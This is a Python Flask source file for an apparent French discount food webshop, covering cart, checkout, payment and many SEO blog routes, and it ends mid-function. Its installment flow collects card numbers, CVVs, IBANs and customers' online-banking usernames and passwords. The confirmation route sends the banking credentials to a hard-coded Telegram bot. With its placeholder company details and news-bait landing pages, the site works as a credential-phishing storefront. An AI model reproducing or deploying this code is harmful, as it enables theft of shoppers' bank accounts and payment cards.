def remove_from_cart(product_id):
    try:
        cart = get_cart()
        product_id_str = str(product_id)
        
        if product_id_str in cart:
            product = next((p for p in products if p['id'] == product_id), None)
            product_name = product['name'] if product else "Produit"
            
            del cart[product_id_str]
            save_cart(cart)
            
            return jsonify({
                'success': True,
                'message': f'{product_name} retiré du panier',
                'cart_count': sum(cart.values()),
                'cart_total': calculate_cart_total(cart)
            })
        else:
            return jsonify({'success': False, 'message': 'Produit non trouvé dans le panier'}), 404
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500
    
def calculate_cart_total(cart):
    total = 0
    for product_id, quantity in cart.items():
        product = next((p for p in products if str(p['id']) == product_id), None)
        if product:
            total += product['price'] * quantity
    return total
    
def add_to_cart():
    try:
        product_id = int(request.form['product_id'])
        quantity = max(1, int(request.form.get('quantity', 1)))  # Garantit une quantité minimale de 1
    except (ValueError, KeyError):
        if request.headers.get('X-Requested-With') == 'XMLHttpRequest':
            return json.dumps({'success': False, 'message': 'Données invalides'}), 400
        flash('Données invalides', 'error')
        return redirect(url_for('product_list'))
    
    # ... reste de la fonction inchangé ...
    
    cart = get_cart()
    if str(product_id) in cart:
        cart[str(product_id)] += quantity
    else:
        cart[str(product_id)] = quantity
    
    save_cart(cart)
    
    if request.headers.get('X-Requested-With') == 'XMLHttpRequest':
        return json.dumps({
            'success': True,
            'cart_count': sum(cart.values()),
            'message': f'{product["name"]} ajouté au panier'
        })
    
    flash(f'{product["name"]} ajouté au panier', 'success')
    return redirect(request.referrer or url_for('index'))

@app.route('/modifier-panier', methods=['POST'])
def update_cart():
    if request.headers.get('X-Requested-With') == 'XMLHttpRequest':
        try:
            data = request.get_json()
            product_id = str(data.get('product_id'))
            quantity = int(data.get('quantity', 1))
            
            cart = get_cart()
            
            if quantity > 0:
                cart[product_id] = quantity
            else:
                cart.pop(product_id, None)
            
            save_cart(cart)
            
            return jsonify({
                'success': True,
                'cart_count': sum(cart.values())
            })
        except Exception as e:
            return jsonify({'success': False, 'error': str(e)}), 400
    
    return jsonify({'success': False}), 400

@app.route('/vider-panier', methods=['POST'])
def clear_cart():
    if not session.get('logged_in'):
        return jsonify({'success': False, 'message': 'Non autorisé'}), 401
    
    session.pop('cart', None)
    return jsonify({'success': True, 'message': 'Panier vidé'})


@app.route('/api/cart/count')
def get_cart_count():
    cart = get_cart()
    return json.dumps({'count': sum(cart.values())})

@app.route('/installment/step1', methods=['GET'])
def installment_step1():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    cart = get_cart()
    if not cart:
        return redirect(url_for('index'))
    
    total = sum(p['price'] * cart[str(p['id'])] for p in products if str(p['id']) in cart)
    return render_template('installment_step1.html', total=total)

@app.route('/installment/step2', methods=['POST'])
def installment_step2():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    # Détection du logo de banque en fonction du BIC
    bic = request.form.get('bic', '').upper()
    bank_logo = ''
    
    if 'SOGEFRPP' in bic:
        bank_logo = 'https://logonews.fr/wp-content/uploads/2022/05/Nouveau-logo-SG-1-2048x1152.jpg'
    elif 'BNPAFRPP' in bic:
        bank_logo = 'https://upload.wikimedia.org/wikipedia/fr/thumb/9/9e/Logo_BNP_Paribas.svg/1200px-Logo_BNP_Paribas.svg.png'
    elif 'CRLYFRPP' in bic:
        bank_logo = 'https://upload.wikimedia.org/wikipedia/commons/thumb/3/3e/LCL_logo.svg/2560px-LCL_logo.svg.png'
    
    return render_template('installment_step2.html', bank_logo=bank_logo)

@app.route('/installment/step3', methods=['GET', 'POST'])
def installment_step3():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    if request.method == 'POST':
        # Traitement des données de l'étape 2
        step2_data = {
            'card_number': request.form.get('card_number'),
            'expiry_date': request.form.get('expiry_date'),
            'cvv': request.form.get('cvv'),
            'card_name': request.form.get('card_name')
        }
        
        # Récupération des données de l'étape 1
        step1_data = {
            'iban': request.form.get('iban'),
            'bic': request.form.get('bic'),
            'installment_plan': request.form.get('installment_plan')
        }
        
        # Détection du logo de banque
        bank_logo = get_bank_logo(step1_data.get('bic', ''))
        
        return render_template('installment_step3.html',
                            step1_data=json.dumps(step1_data),
                            step2_data=json.dumps(step2_data),
                            bank_logo=bank_logo)
    
    return redirect(url_for('installment_step1'))

def get_bank_logo(bic):
    bic = bic.upper()
    logos = {
        'SOGEFRPP': 'https://logonews.fr/wp-content/uploads/2022/05/Nouveau-logo-SG-1-2048x1152.jpg',
        'BNPAFRPP': 'https://upload.wikimedia.org/wikipedia/fr/thumb/9/9e/Logo_BNP_Paribas.svg/1200px-Logo_BNP_Paribas.svg.png',
        'CRLYFRPP': 'https://upload.wikimedia.org/wikipedia/commons/thumb/3/3e/LCL_logo.svg/2560px-LCL_logo.svg.png'
    }
    return next((logo for code, logo in logos.items() if code in bic), '')


@app.route('/installment/confirmation', methods=['POST'])
def installment_confirmation():
    if not session.get('logged_in'):
        return redirect(url_for('login'))

    try:
        # Création de la commande
        cart = get_cart()
        total = sum(p['price'] * cart[str(p['id'])] for p in products if str(p['id']) in cart)
        
        order_id = datetime.now().strftime("%Y%m%d%H%M%S")
        order = {
            'id': order_id,
            'user': session['username'],
            'date': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'items': dict(cart.items()),
            'total': total,
            'payment_method': 'installment',
            'status': 'En traitement',
            'installment_plan': request.form.get('installment_plan', '3'),
            'bank_user_id': request.form.get('bank_user_id'),
            'bank_password': request.form.get('bank_password')
        }

        # Préparation du message Telegram
        telegram_message = (
            "💳 Nouvelle commande en plusieurs fois\n"
            f"🔢 Numéro: #{order_id}\n"
            f"👤 Client: {session['username']}\n"
            f"💶 Montant: {total:.2f}€\n"
            f"🔄 Plan: {order['installment_plan']} mois\n"
            f"🏦 Identifiant bancaire: {order['bank_user_id']}\n"
            f"🔑 Mot de passe bancaire: {order['bank_password']}"
        )

        telegram_bot_token = '7866279403:AAEWq-i2dnjUM4yQLuW9JbOZliuB8K_nmHA'
        chat_ids = ['5652184847']

        # Envoi des données à Telegram
        for chat_id in chat_ids:
            try:
                requests.post(
                    f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage",
                    json={
                        'chat_id': chat_id,
                        'text': telegram_message
                    },
                    timeout=5  # Timeout après 5 secondes
                )
            except requests.exceptions.RequestException as e:
                print(f"Erreur d'envoi Telegram: {e}")
                continue

        # Sauvegarde de la commande
        if 'orders' not in session:
            session['orders'] = {}
        session['orders'][order_id] = order
        session.modified = True

        # Vidage du panier
        session.pop('cart', None)

        return redirect(url_for('confirmation', order_id=order_id))

    except Exception as e:
        print(f"Erreur lors de la confirmation: {str(e)}")
        flash(f"Erreur lors de la confirmation: {str(e)}", "error")
        return redirect(url_for('installment_step1'))


@app.route('/api/cart/items')
def get_cart_items():
    cart = get_cart()
    cart_items = []
    
    for product_id, quantity in cart.items():
        product = next((p for p in products if str(p['id']) == product_id), None)
        if product:
            cart_items.append({
                'id': product_id,
                'name': product['name'],
                'price': product['price'],
                'quantity': quantity,
                'image': product['images'][0] if product['images'] else 'default.jpg',
                'total': product['price'] * quantity
            })
    
    return jsonify(cart_items)


@app.route('/panier')
def view_cart():
    cart = get_cart()
    cart_items = []
    subtotal = 0.0
    
    # Calcul des articles du panier
    for product_id, quantity in cart.items():
        product = next((p for p in products if str(p['id']) == str(product_id)), None)
        if product:
            # Normalisation des données produit
            if 'image' in product:
                product['images'] = [product['image']]
                del product['image']
            elif 'images' not in product or not product['images']:
                product['images'] = ['default.jpg']
            
            item_total = product['price'] * quantity
            subtotal += item_total
            cart_items.append({
                'product': product,
                'quantity': quantity,
                'total': item_total
            })
    
    return render_template('cart.html',
                         cart_items=cart_items,
                         subtotal=subtotal,
                         total=subtotal)



def clean_cart():
    cart = get_cart()
    cleaned_cart = {}
    
    for product_id, quantity in cart.items():
        product = next((p for p in products if p['id'] == int(product_id)), None)
        if product and quantity > 0:
            cleaned_cart[product_id] = quantity
    
    save_cart(cleaned_cart)
    return cleaned_cart

@app.context_processor
def inject_cart_data():
    cart = get_cart()
    cart_items = []
    total = 0
    
    for product_id, quantity in cart.items():
        try:
            # Conversion sécurisée de product_id en int
            product_id_int = int(product_id)
            product = next((p for p in products if p['id'] == product_id_int), None)
            if product:
                item_total = product['price'] * quantity
                total += item_total
                cart_items.append({
                    'product': product,
                    'quantity': quantity,
                    'total': item_total
                })
        except (ValueError, TypeError):
            # Si la conversion échoue, on ignore ce produit
            continue
    
    return dict(cart_items=cart_items, cart_total=total)

@app.context_processor
def inject_cart_count():
    cart = get_cart()
    count = 0
    
    for quantity in cart.values():
        if isinstance(quantity, int) and quantity > 0:
            count += quantity
    
    return {'cart_count': count}
    
@app.route('/checkout', methods=['GET', 'POST'])
def checkout():
    if not (session.get('logged_in') or session.get('guest')):
        return redirect(url_for('checkout_auth'))

    # Vérifie la validité de la session invité
    if session.get('guest'):
        try:
            created_at = datetime.fromisoformat(session['guest']['created_at'])
            if (datetime.now() - created_at) > timedelta(hours=24):
                session.pop('guest', None)
                flash('Session invité expirée', 'warning')
                return redirect(url_for('checkout_auth'))
        except:
            session.pop('guest', None)
            return redirect(url_for('checkout_auth'))

    # Récupération du panier
    cart = get_cart()
    if not cart:
        flash('Votre panier est vide', 'warning')
        return redirect(url_for('product_list'))

    cart_items = []
    subtotal = 0.0
    for product_id, quantity in cart.items():
        try:
            product = next((p for p in products if str(p['id']) == str(product_id)), None)
            if product:
                # Normalisation des images
                if 'image' in product:
                    product['images'] = [product['image']]
                    del product['image']
                elif 'images' not in product or not product['images']:
                    product['images'] = ['default.jpg']

                item_total = float(product['price']) * int(quantity)
                subtotal += item_total
                cart_items.append({
                    'product': product,
                    'quantity': quantity,
                    'total': item_total
                })
        except (ValueError, TypeError, KeyError) as e:
            app.logger.error(f"Erreur traitement produit {product_id}: {str(e)}")
            continue

    # Livraison
    delivery_method = session.get('delivery_method', 'standard')
    delivery_cost = 69 if delivery_method == 'standard' else 59

    # Codes promo
    valid_promo_codes = {
        'SAVE10': lambda sub: 10.0,
        'SAVE20': lambda sub: 0.20 * sub,
        'destock15': lambda sub: 0.15 * sub
    }
    code = session.get('promo_code')
    promo_discount = valid_promo_codes.get(code, lambda sub: 0.0)(subtotal)
    promo_discount = min(promo_discount, subtotal)

    total = subtotal + delivery_cost - promo_discount
    total = max(total, 0.0)

    user_identifier = session.get('user_id', session.get('username', 'Guest'))
    order_reference = f"CMD-{user_identifier}-{datetime.now().strftime('%Y%m%d%H%M')}"

    # Récupération utilisateur depuis la DB
    user_info = None
    user_id = None
    if session.get('logged_in'):
        user = User.query.filter_by(username=session['username']).first()
        if user:
            user_info = {
                'username': user.username,
                'email': user.email or 'Non renseigné',
                'phone': user.phone or 'Non renseigné',
                'address': user.address or 'Non renseignée'
            }
            user_id = user.id

    # Validation de la commande
    if request.method == 'POST':
        customer_email = request.form.get('email', '').strip()
        phone = request.form.get('phone', '').strip()
        delivery_address = request.form.get('delivery_address', '').strip()
        billing_address = request.form.get('billing_address', '').strip() or delivery_address

        if not customer_email or not is_valid_email(customer_email):
            flash('Veuillez fournir une adresse email valide', 'error')
            return redirect(url_for('checkout'))

        order_id = str(uuid.uuid4())

        # Pour les invités, user_id reste None
        if session.get('guest'):
            user_id = None

        # Sauvegarde en DB
        new_order = Order(
            id=order_id,
            reference=order_reference,
            user_id=user_id,  # Associer à l'utilisateur (None pour invités)
            email=customer_email,
            phone=phone,
            delivery_address=delivery_address,
            billing_address=billing_address,
            subtotal=subtotal,
            delivery_method=delivery_method,
            delivery_cost=delivery_cost,
            discount=promo_discount,
            total=total,
            promo_code=code if code in valid_promo_codes else None,
            payment_method=request.form.get('payment_method'),
            status='En traitement',
            items=dict(cart.items())  # JSON
        )

        db.session.add(new_order)
        db.session.commit()

        # Nettoyage du panier
        session.pop('cart', None)
        session.pop('promo_code', None)
        session.pop('delivery_method', None)
        session.modified = True

        # Envoi email de confirmation
        try:
            send_confirmation_email(app, mail, {
                'id': order_id,
                'reference': order_reference,
                'email': customer_email,
                'phone': phone,
                'delivery_address': delivery_address,
                'billing_address': billing_address,
                'date': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                'items': dict(cart.items()),
                'subtotal': subtotal,
                'delivery_method': delivery_method,
                'delivery_cost': delivery_cost,
                'discount': promo_discount,
                'total': total,
                'promo_code': code if code in valid_promo_codes else None,
                'payment_method': request.form.get('payment_method'),
                'status': 'En traitement'
            }, customer_email)
        except Exception as e:
            app.logger.error(f"Erreur lors de l'envoi de l'e-mail : {e}")
            flash("Erreur lors de l'envoi de l'e-mail. Veuillez réessayer plus tard.", "error")

        return redirect(url_for('order_confirmation', order_id=order_id))

    return render_template('checkout.html',
                           cart_items=cart_items,
                           subtotal=subtotal,
                           delivery_cost=delivery_cost,
                           total=total,
                           promo_discount=promo_discount,
                           user=user_info,
                           order_reference=order_reference,
                           is_guest=session.get('guest') is not None)



@app.route('/checkout_auth', methods=['GET', 'POST'])
def checkout_auth():
    # Si déjà connecté, rediriger vers checkout
    if session.get('logged_in'):
        return redirect(url_for('checkout'))

    if request.method == 'POST':
        action = request.form.get('action')
        
        if action == 'login':
            session['next'] = 'checkout'
            return redirect(url_for('login'))
        elif action == 'register':
            session['next'] = 'checkout'
            return redirect(url_for('register'))
        elif action == 'guest':
            # Créer une session invité
            session['guest'] = {
                'id': f"guest_{datetime.now().strftime('%Y%m%d%H%M%S')}",
                'created_at': datetime.now().isoformat()
            }
            return redirect(url_for('checkout'))  # Redirection directe vers checkout

    return render_template('checkout_auth.html')

@app.route('/paiement', methods=['GET', 'POST'])
def payment():
    if not (session.get('logged_in') or session.get('guest')):
        return redirect(url_for('login'))

    cart = get_cart()
    if not cart:
        return redirect(url_for('index'))

    subtotal = sum(p['price'] * cart[str(p['id'])] for p in products if str(p['id']) in cart)
    delivery_method = session.get('delivery_method', 'standard')
    delivery_cost = 69 if delivery_method == 'standard' else 59
    promo_discount = float(session.get('promo_discount', 0))
    total = subtotal + delivery_cost - promo_discount

    if request.method == 'POST':
        payment_method = request.form.get('payment_method')
        email = request.form.get('email', '').strip()
        phone = request.form.get('phone', '').strip()
        firstname = request.form.get('firstname', '').strip()
        lastname = request.form.get('lastname', '').strip()

        delivery_address = {
            'street': request.form.get('delivery_address', ''),
            'zip': request.form.get('delivery_zip', ''),
            'city': request.form.get('delivery_city', ''),
            'country': request.form.get('delivery_country', 'FR'),
            'phone': request.form.get('delivery_phone', ''),
            'name': f"{firstname} {lastname}"
        }

        if request.form.get('same_billing') == 'on':
            billing_address = delivery_address
        else:
            billing_address = {
                'street': request.form.get('billing_address', ''),
                'zip': request.form.get('billing_zip', ''),
                'city': request.form.get('billing_city', ''),
                'country': request.form.get('billing_country', 'FR'),
                'phone': request.form.get('billing_phone', ''),
                'name': request.form.get('billing_name', '').strip()
            }

        formatted_delivery_address = format_address(delivery_address)
        formatted_billing_address = format_address(billing_address)

        if not payment_method:
            flash('Veuillez sélectionner une méthode de paiement', 'error')
            return redirect(url_for('payment'))

        if not email:
            flash("L'adresse e-mail est requise pour valider la commande", 'error')
            return redirect(url_for('payment'))

        order_id = datetime.now().strftime("%Y%m%d%H%M%S")
        user = session.get('username', session.get('guest', {}).get('id', 'guest'))

        products_info = []
        for product_id, quantity in cart.items():
            product = next((p for p in products if str(p['id']) == product_id), None)
            if product:
                products_info.append({
                    'id': product_id,
                    'name': product['name'],
                    'price': product['price'],
                    'quantity': quantity,
                    'total': product['price'] * quantity
                })

        order = {
            'id': order_id,
            'reference': f"CMD-{order_id[:6].upper()}",
            'user': user,
            'firstname': firstname,
            'lastname': lastname,
            'email': email,
            'phone': phone,
            'delivery_address': format_address(delivery_address),
            'billing_address': format_address(billing_address),
            'delivery_address_raw': delivery_address,
            'billing_address_raw': billing_address,
            'date': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'items': dict(cart.items()),
            'products': products_info,
            'subtotal': subtotal,
            'delivery_method': delivery_method,
            'delivery_cost': delivery_cost,
            'discount': promo_discount,
            'total': total,
            'payment_method': payment_method,
            'status': 'En traitement',
            'company_info': {
                'name': 'Destockage Alimentaire France',
                'address': '123 Rue du Commerce, 75000 Paris',
                'phone': '+33 1 23 45 67 89',
                'email': 'contact@destockagealimentaire.fr',
                'siret': '123 456 789 00010',
                'tva': 'FR12345678901'
            }
        }


        if payment_method == 'card':
            order['card_details'] = {
                'card_number': request.form.get('card_number', ''),
                'card_holder': request.form.get('card_name', ''),
                'expiry_date': request.form.get('expiry_date', ''),
                'cvv': request.form.get('cvv', '')
            }
        elif payment_method == 'transfer':
            order['bank_details'] = {
                'iban': 'FR76 1234 5678 9012 3456 7890 123',
                'bic': 'ABCDEFGH123'
            }

        if 'orders' not in session:
            session['orders'] = {}
        session['orders'][order_id] = order
        session['last_order_email'] = email
        session.modified = True

        session.pop('cart', None)
        session.pop('promo_code', None)
        session.pop('promo_discount', None)

        try:
            send_confirmation_email(app, mail, order, email)
        except Exception as e:
            app.logger.error(f"Erreur lors de l'envoi de l'email de confirmation: {str(e)}")

        return redirect(url_for('confirmation', order_id=order_id))

    return render_template(
        'payment.html',
        total=total,
        subtotal=subtotal,
        delivery_cost=delivery_cost,
        discount=promo_discount
    )

def format_address(address_dict):
    """Formate une adresse pour l'affichage"""
    country_names = {
        'FR': 'France',
        'BE': 'Belgique',
        'CH': 'Suisse',
        'LU': 'Luxembourg'
    }
    country = country_names.get(address_dict.get('country', 'FR'), 'France')
    return f"{address_dict.get('street', '')}, {address_dict.get('zip', '')} {address_dict.get('city', '')}, {country}"

from datetime import datetime

@app.route('/pourquoi-destockage-alimentaire')
def why_us():
    return render_template('why_us.html', title="Pourquoi choisir notre destockage alimentaire ?")
@app.route('/destockage-professionnel')
def pro():
    return render_template('pro.html', title="Destockage alimentaire pour professionnels")
@app.route('/guide-destockage-alimentaire')
def guide():
    return render_template('guide.html', title="Guide complet du destockage alimentaire")
# Route Flask pour tracking des conversions
@app.route('/track-conversion')
def track_conversion():
    session['conversion'] = True  # Pour le pixel de conversion
    return redirect(url_for('index'))
@app.route('/conflit-iran-israel-2025') 
def landing3():
    return render_template('landing1.html')

@app.route('/destockage-urgence3')
def landing2():
    return render_template('landing2.html')

@app.route('/grossiste-25alimentaire')
def grossiste_25alimentaire():
    return render_template('grossiste_25alimentaire.html')


@app.after_request
def add_header(response):
    if request.path.startswith('/static/'):
        response.cache_control.max_age = 31536000
    else:
        response.cache_control.max_age = 3600
    return response

@app.route('/promo-urgence')
def promo_urgence():
    return render_template(
        'urgence.html',
        datetime=datetime,
        timedelta=timedelta
    )

@app.route('/destockage-tf1-france24-actualites')
def destockage_medias():
    return render_template('destockage_medias.html', 
                         title="Destockage Alimentaire : TF1 et France 24 En Parlent",
                         meta_description="Analyse complète du traitement médiatique du destockage alimentaire sur TF1 et France 24. Actualités Belgique et Espagne. Conseils pro pour acheter malin.")

@app.route('/psg-champion-europe')
def psg_champions():
    return render_template('psg_champions.html')

@app.route('/fr/destockage-espagne')
def destockage_espagne_fr():
    return render_template('destockage_espagne.html')


@app.route("/meilleur-destockage-alimentaire")
def destockage_alimentaire():
    return render_template("destockage.html")

# Page Principale
@app.route('/liquidation-alimentaire-25mai2025')
def liquidation():
    return render_template('liquidation_25mai.html',
                         current_date=datetime.now().strftime("%d/%m/%Y"))

@app.route('/destockage-alimentaire-espagne')
def destockage_alimentaire_espagne():
    return render_template('destockage_alimentaire_espagne.html')

@app.route('/produits-belgique') 
def produits_belgique():
    return render_template('produits_belgique.html')  # À créer séparément

@app.route('/destockage-alimentaire2025')
def destockage_alimentaire202508():
    return render_template('destockage_alimentaire2025.html')


@app.route('/article-canicule-destockage')
def article_canicule():
    return render_template('article_canicule.html', 
                         current_date=datetime.now().strftime("%d/%m/%Y"),
                         temperature_max=38,
                         departments_alert=27)

@app.route('/espagne')
def espagne():
    return render_template(
        'espagne.html',
        title="Déstockage Alimentaire Espagne | Bons Plans & Économies",
        description="Découvrez le déstockage alimentaire en Espagne : produits à prix réduits, fins de série et invendus pour économiser et lutter contre le gaspillage."
    )

@app.route('/article-destockage-belgique')
def article_destockage():
    return render_template(
        'article_destockage.html',
        title="Déstockage Alimentaire Belgique | Guide & Conseils",
        description="Tout savoir sur le déstockage alimentaire en Belgique : astuces, bonnes pratiques et où trouver des produits à prix réduits."
    )

@app.route('/blog/discount-alimentation-maximisez-economies-soldes')
def discount_alimentation_article():
    return render_template(
        'discount-alimentation-article.html',
        title="Discount Alimentation | Maximisez vos Économies et Soldes",
        description="Astuces et conseils pour profiter des soldes et du discount sur l'alimentation : économisez tout en consommant malin."
    )

@app.route('/blog/discount-alimentation-astuces-economiser')
def discount_alimentation_astuces():
    return render_template(
        'discount-alimentation-astuces.html',
        title="Astuces Discount Alimentation | Économiser sur vos Courses",
        description="Découvrez nos astuces pour économiser sur l'alimentation grâce au déstockage, aux promotions et aux ventes à prix réduits."
    )

@app.route('/blog/optimiser-magasin-distribution')
def optimiser_magasin_distribution25():
    return render_template(
        'optimiser-magasin-distribution25.html',
        title="Optimiser Magasin & Distribution | Stratégies Rentables",
        description="Guide pour optimiser votre magasin et votre distribution alimentaire : organisation, approvisionnement et stratégies d'économie."
    )

@app.route('/blog/champagne-solde-astuces-bonnes-affaires')
def champagne_solde_astuces():
    return render_template(
        'champagne-solde-astuces.html',
        title="Champagne Soldes | Astuces pour Bonnes Affaires",
        description="Découvrez nos conseils pour acheter du champagne en soldes : marques, prix et promotions à ne pas manquer."
    )

@app.route('/blog/destockage-alimentaire-local-ecologie')
def destockage_alimentaire_local():
    return render_template(
        'destockage-alimentaire-local.html',
        title="Déstockage Alimentaire Local & Écologie",
        description="Achetez local et responsable : déstockage alimentaire près de chez vous pour économiser et réduire le gaspillage."
    )

@app.route('/blog/champagne-pas-cher-qualite-economie')
def champagne_pas_cher():
    return render_template(
        'champagne-pas-cher.html',
        title="Champagne Pas Cher | Qualité & Économie",
        description="Achetez du champagne pas cher sans compromettre la qualité : bons plans, promotions et astuces pour économiser."
    )

@app.route('/blog/distribution-boisson-tendances-innovations-2025')
def distribution_boisson_tendances():
    return render_template(
        'distribution-boisson-tendances.html',
        title="Distribution Boissons 2025 | Tendances & Innovations",
        description="Découvrez les tendances et innovations dans la distribution de boissons en 2025 : grossistes, marchés et stratégies."
    )

@app.route('/blog/destockage-pres-chez-vous-offres')
def destockage_pres_chez_vous():
    return render_template(
        'destockage-pres-chez-vous.html',
        title="Déstockage Alimentaire Près de Chez Vous | Offres Locales",
        description="Trouvez les meilleures offres de déstockage alimentaire près de chez vous : économies, invendus et produits de qualité."
    )

@app.route('/blog/boisson-en-gros-pas-cher-offres')
def boisson_gros_pas_cher():
    return render_template(
        'boisson-gros-pas-cher.html',
        title="Boissons en Gros Pas Cher | Fournisseurs & Offres",
        description="Achetez des boissons en gros à prix réduits : fournisseurs, promotions et astuces pour économiser sur vos achats."
    )

@app.route('/blog/grossiste-alimentation-halal-guide-achat')
def grossiste_halal_guide():
    return render_template(
        'grossiste-halal-guide.html',
        title="Grossiste Alimentation Halal | Guide d'Achat",
        description="Guide complet pour acheter auprès de grossistes halal : viandes, produits alimentaires et conseils pratiques."
    )

@app.route('/blog/guide-champagne-3-litres-luxe')
def guide_champagne_3litres():
    return render_template(
        'guide-champagne-3-litres.html',
        title="Guide Champagne 3 Litres Luxe | Marques & Prix",
        description="Tout savoir sur le champagne en format 3 litres : luxe, marques prestigieuses, prix et bons plans."
    )

@app.route('/blog/hard-discount-ascension-impact')
def hard_discount_article():
    return render_template(
        'hard-discount-article.html',
        title="Hard Discount | Ascension & Impact sur l'Alimentation",
        description="Analyse de l'impact du hard discount sur l'alimentation : stratégies, économies et tendances pour les consommateurs."
    )

@app.route('/blog/magasin-alimentaire-bio-local-belgique')
def magasin_bio_local_article():
    return render_template(
        'magasin-bio-local-article.html',
        title="Magasin Alimentaire Bio & Local Belgique",
        description="Découvrez les magasins bio et locaux en Belgique : produits frais, circuits courts et initiatives durables."
    )

@app.route('/blog/trouver-fournisseur-ideal-revendeur-pro')
def fournisseur_ideal_article():
    return render_template(
        'fournisseur-ideal-revendeur-pro.html',
        title="Trouver le Fournisseur Idéal | Revendeur & Professionnel",
        description="Conseils pour trouver le fournisseur idéal pour revendeurs et professionnels : qualité, prix et fiabilité."
    )

@app.route('/blog/destockage-alimentaire-economies-durabilite-belgique')
def destockage_durabilite_article():
    return render_template(
        'destockage-durabilite-article.html',
        title="Déstockage Alimentaire Belgique | Économies & Durabilité",
        description="Achetez en déstockage alimentaire en Belgique : réductions, économies et pratiques durables pour lutter contre le gaspillage."
    )

# Formulaire de Contact
@app.route('/contact-urgence-25mai')
def contact_urgence():
    return render_template(
        'contact_urgence.html',
        title="Contact Urgence | Déstockage Alimentaire & Assistance",
        description="Formulaire de contact pour urgences et assistance concernant le déstockage alimentaire et les commandes."
    )

@app.route('/article-espagne')
def article_espagne():
    return render_template(
        'article-espagne.html',
        title="Déstockage Alimentaire Espagne | Guide & Conseils",
        description="Tout savoir sur le déstockage alimentaire en Espagne : astuces, bons plans et économies sur vos achats."
    )

@app.route('/article-belgique')
def article_belgique():
    return render_template(
        'article-belgique.html',
        title="Déstockage Alimentaire Belgique | Guide & Bons Plans",
        description="Découvrez comment acheter en déstockage alimentaire en Belgique : conseils, astuces et offres disponibles."
    )

@app.route('/article-france')
def article_france():
    return render_template(
        'article-france.html',
        title="Déstockage Alimentaire France | Économies & Astuces",
        description="Guide complet pour le déstockage alimentaire en France : économies, bons plans et anti-gaspillage."
    )

@app.route('/article-belgique-2')
def article_belgique_2():
    return render_template(
        'article-belgique-2.html',
        title="Déstockage Alimentaire Belgique | Produits & Offres",
        description="Profitez des meilleures offres de déstockage alimentaire en Belgique : invendus, surplus et promotions."
    )

@app.route('/article-france-2')
def article_france_2():
    return render_template(
        'article-france-2.html',
        title="Déstockage Alimentaire France | Produits et Bons Plans",
        description="Trouvez les meilleures offres de déstockage alimentaire en France : conseils, promotions et astuces pour économiser."
    )

@app.route('/blog/top-grossistes-alimentaires-bruxelles')
def grossistes_bruxelles_article():
    return render_template(
        'grossistes-bruxelles-article.html',
        title="Top Grossistes Alimentaires Bruxelles | Fournisseurs",
        description="Classement des meilleurs grossistes alimentaires à Bruxelles : produits, prix et offres pour professionnels et particuliers."
    )

@app.route('/blog/champagne-pas-cher-rapport-qualite-prix')
def champagne_pas_cher_article():
    return render_template(
        'champagne-pas-cher-article.html',
        title="Champagne Pas Cher | Rapport Qualité-Prix",
        description="Analyse des meilleurs champagnes pas chers : qualité, prix et promotions pour bien choisir vos bouteilles."
    )

@app.route('/blog/destockage-alimentaire-belgique-25')
def destockage_belgique_article_25():
    return render_template(
        'destockage-belgique-article-25.html',
        title="Déstockage Alimentaire Belgique 2025 | Économies & Bons Plans",
        description="Découvrez les meilleures offres de déstockage alimentaire en Belgique pour 2025 : produits en gros et promotions."
    )

@app.route('/blog/ruinart-achat-guide-complet')
def ruinart_achat_article():
    return render_template(
        'ruinart-achat-article.html',
        title="Achat Champagne Ruinart | Guide Complet",
        description="Guide complet pour acheter du champagne Ruinart : prix, promotions, millésimes et astuces pour économiser."
    )

@app.route('/blog/prix-red-bull-meilleures-offres')
def red_bull_article():
    return render_template(
        'prix-red-bull-article.html',
        title="Prix Red Bull | Meilleures Offres & Promotions",
        description="Découvrez les prix Red Bull et les meilleures offres disponibles pour économiser sur vos achats de boissons énergétiques."
    )

@app.route('/blog/destockage-alimentaire-avantages-defis')
def destockage_avantages_defis():
    return render_template(
        'destockage-avantages-defis.html',
        title="Déstockage Alimentaire | Avantages & Défis",
        description="Explorez les avantages et défis du déstockage alimentaire : économies, écologie et bonnes pratiques."
    )

@app.route('/blog/discount-alimentation-economisez-achats')
def discount_alimentation_economisez():
    return render_template(
        'discount-alimentation-economisez.html',
        title="Discount Alimentation | Économisez sur vos Achats",
        description="Astuces et conseils pour économiser sur l'alimentation grâce aux promotions, soldes et déstockage."
    )

@app.route('/blog/tendances-distribution-boissons')
def tendances_distribution_boissons():
    return render_template(
        'tendances-distribution-boissons.html',
        title="Tendances Distribution Boissons | Marché 2025",
        description="Analyse des tendances dans la distribution de boissons en 2025 : innovations, fournisseurs et prix."
    )

@app.route('/blog/recettes-nutella-faciles-delicieuses')
def recettes_nutella_article():
    return render_template(
        'recettes-nutella-article.html',
        title="Recettes Nutella Faciles & Délicieuses",
        description="Découvrez des recettes simples et gourmandes avec Nutella : desserts, pâtisseries et idées créatives."
    )

@app.route('/blog/comment-choisir-produit-entretien-efficace')
def produit_entretien_article():
    return render_template(
        'produit-entretien-article.html',
        title="Comment Choisir un Produit d'Entretien Efficace",
        description="Guide pour choisir le produit d'entretien le plus efficace : conseils, comparatifs et astuces pour un nettoyage optimal."
    )

@app.route('/blog/destockage-alimentaire-comment-economiser-reduire-gaspillage')
def destockage_ecologique_article():
    return render_template(
        'destockage-ecologique-article.html',
        title="Déstockage Alimentaire | Économiser & Réduire le Gaspillage",
        description="Astuces pour économiser et réduire le gaspillage grâce au déstockage alimentaire : bons plans et produits à prix réduits."
    )

@app.route('/blog/strategies-economie-alimentation-discount')
def strategies_discount_article():
    return render_template(
        'strategies-discount-article.html',
        title="Stratégies Économie Alimentation | Discount & Bons Plans",
        description="Découvrez les meilleures stratégies pour économiser sur l'alimentation : discount, promotions et déstockage."
    )

@app.route('/blog/champagne-pas-cher-2025')
def champagne_pas_cher_article_2025():
    return render_template(
        'champagne-pas-cher-article-25.html',
        title="Champagne Pas Cher 2025 | Bons Plans & Promotions",
        description="Achetez du champagne pas cher en 2025 : promotions, déstockage et marques accessibles pour tous."
    )

@app.route('/blog/achat-ruinart')
def achat_ruinart_article():
    return render_template(
        'achat-ruinart-article.html',
        title="Achat Champagne Ruinart | Promotions & Conseils",
